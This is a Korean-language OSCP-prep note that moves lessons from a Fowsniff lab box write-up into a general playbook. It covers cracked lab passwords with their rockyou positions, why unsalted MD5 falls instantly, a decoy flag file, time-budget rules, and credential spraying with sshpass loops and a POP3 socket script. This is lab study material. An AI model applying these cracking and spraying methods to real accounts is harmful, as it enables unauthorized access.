[[Fowsniff]] 실측 — `scoobydoo2` 17577 · `orlando12` 81318 · `apples01` 119135 · `skyler22` 166758 · `mailcall` 622357 · `07011972` 2424341 · `carp4ever` 9279098 · `bilbo101` 9627898 로 **john 출력 순서와 정확히 일치**함(2026-08-26 rockyou 재조회).

**출처** — [[Fowsniff]] (9개 중 8개, 1초 미만).

### 지우기 전 원문 (Fowsniff.md 2장)

```
### 왜 MD5 가 즉시 풀리는가

솔트가 없으므로 같은 평문은 항상 같은 해시다. 후보 단어 하나를 한 번 해싱해 9개 해시 전부와 비교할 수 있다 — 사전 단어당 비용이 계정 수와 무관하다. john 이 9개를 "no different salts" 로 로드했다고 알려주는 게 정확히 이 뜻이다.
```
(⚠️ 이 문단의 **취약점 설명 부분**은 노트의 `Vulnerability Explanation:` 으로 옮겨 살아 있음. `--format`·`--show`·행순서 검산 서술은 노트 `Initial Access` 재현 절에도 유지했음 — 재현에 필요한 절차라 양쪽에 둠.)

---

## 제안 10 — `C-3. 플래그·증거` · **병합**

### 넣을 본문 (C-3 에 append)

- **`/root` 에 flag 로 보이는 파일이 둘이면 둘 다 읽을 것.** [[Fowsniff]] 의 `/root/flag.txt` 는 **미끼**였음 — 내용이 `Your flag is in another file...`. 원본 VulnHub 판의 잔재이고 PG 가 채점하는 것은 `proof.txt` 임.

### 지우기 전 원문 (Fowsniff.md 7장 8번)

```
8. **`/root` 에 flag 후보가 둘이면 둘 다 읽는다.** `flag.txt` 는 미끼였다.
```
(플래그 값과 미끼 사실 자체는 노트 `Post-Exploitation` 에 **유지**했음.)

---

## 제안 11 — `D. 시간 배분 · 손절 기준` · **병합**

### 넣을 본문 (D 에 append)

**정적 웹은 15분에 접는다.** 판정 기준은 셋 — 폼 없음 · 동적 확장자 없음 · 파라미터 없음. 셋이 다 참이면 웹은 서사 전달용이고 공격면이 아님.
[[Fowsniff]] 실측(`writeup_notes.txt` 시간순 기록, Kali 로컬시각) — **14:53 → 15:05, 약 12분**에 root. 내역은 정찰 3분 · **이미지 스테가노 헛다리 5분** · 크랙+스프레이 4분 · 권한상승 3분(구간이 일부 겹침). 5분이 그 규율을 어긴 부분임.
메커니즘을 `/proc` ppid 체인으로 확인한 15:06~15:07 은 플래그를 잡은 뒤 노트를 위해 추가로 한 작업이라 공략 시간에 넣지 않음.

### 지우기 전 원문 (Fowsniff.md 6장 · 7장 9번)

```
### 시간 배분

시간순 기록 기준 14:53 → 15:05, 약 12분(정찰 3분, 이미지 헛다리 5분, 크랙+스프레이 4분, 권한상승 3분 — 겹치는 구간이 있다). 메커니즘을 `/proc` ppid 체인으로 확인한 15:06~15:07 은 플래그를 잡은 뒤 노트를 위해 추가로 한 작업이라 공략 시간에 넣지 않았다.
```
```
9. **손절 지점** — 웹에 동적 페이지가 하나도 없다고 판정되면(폼 없음, 확장자 없음, 파라미터 없음) 웹은 15분 안에 접는다. 이 박스에서 이미지 스테가노를 판 5분이 그 규율을 어긴 부분이다.
```

---

## 제안 12 — `E. OSCP 시험 규정 — 금지 / 제한 / 허용` · **병합**

### 넣을 본문 (E 의 「허용」 서술에 한 줄 append)

**대상 수가 적으면 허용 도구보다 손이 빠르다.** hydra 는 허용이지만 [[Fowsniff]] 는 계정이 9개뿐이라 `for` 루프 + `sshpass`(SSH) · 30행 python 소켓(POP3)로 도는 편이 빨랐음. **도구 선택을 규정 문제로 착각하지 말 것** — 이 부류는 애초에 금지 도구를 쓸 일이 없음.

### 지우기 전 원문

제안 6 의 7장 7번과 같은 문단에서 갈라진 것임(중복 인용 생략).

---

## 이관하지 «않은» 것 — 노트에 남긴 근거

| 원문 위치 | 처리 |
|---|---|
| 8장 방어 관점 6항목 | 노트 두 finding 의 `Vulnerability Fix:` 로 분산. `_PLAYBOOK` 이관 아님 |
| 9장 Dovecot 소스 파일 목록 | 노트 `## 관련` 에 유지 + 제안 3 본문에도 수치로 포함 |
| 5장 플래그 값·타임존 환산 | 노트 `Initial Access` / `Post-Exploitation` 에 유지 |
| 「남긴 흔적」 8항목 | 노트 `Post-Exploitation` 에 전량 유지 |
| 4장 「대안 경로」 SUID rootbash · `stone` 미탐색 `[가정]` | 노트 `Privilege Escalation` 에 유지(수동 대안은 STANDARD 요구사항) + 제안 7 에도 한 줄 |
